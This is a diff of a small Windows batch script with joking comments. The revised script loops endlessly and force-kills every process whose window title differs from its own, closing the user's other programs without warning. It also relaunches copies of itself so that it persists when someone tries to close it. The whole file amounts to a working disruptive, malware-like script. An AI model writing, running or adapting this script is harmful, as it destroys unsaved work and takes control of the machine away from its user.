@@ -1,15 +1,14 @@
-::Refine this and make it better.
 @ECHO OFF
 SET n=0
 :next
 SET /a n+=1
-TITLE %n%
-::You need to make it so it doesn't just check the last one (below)
-FOR /F "tokens=* USEBACKQ" %%F IN (`tasklist /FI "WINDOWTITLE eq ^%n^%" ^| find/c "exe"`) DO (
+TITLE 1
+FOR /F "tokens=* USEBACKQ" %%F IN (`tasklist /FI "WINDOWTITLE eq 1" ^| find/c "exe"`) DO (
 SET windowcount=%%F
 )
-taskkill /F /FI "WINDOWTITLE eq Command Prompt"
-IF "%windowcount%"=="1" (
+taskkill /F /FI "WINDOWTITLE ne 1"
+IF "%windowcount%" LSS "2" (
 START 1.bat
 )
 GOTO :next
+::If less than 2 windows open, open another. Lets hope both versions open don't open another at the same time XD.
